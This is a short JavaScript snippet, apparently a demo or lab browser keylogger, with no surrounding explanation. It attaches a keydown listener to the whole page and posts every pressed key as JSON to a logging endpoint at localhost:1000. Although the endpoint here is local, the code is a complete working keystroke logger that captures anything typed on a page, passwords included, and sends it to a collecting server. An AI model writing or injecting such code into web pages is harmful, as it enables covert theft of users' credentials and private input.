document.addEventListener("keydown", (event) => {
  // send event.key on the body of the request
  fetch("http://localhost:1000/log", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ key: event.key }),
  });
});
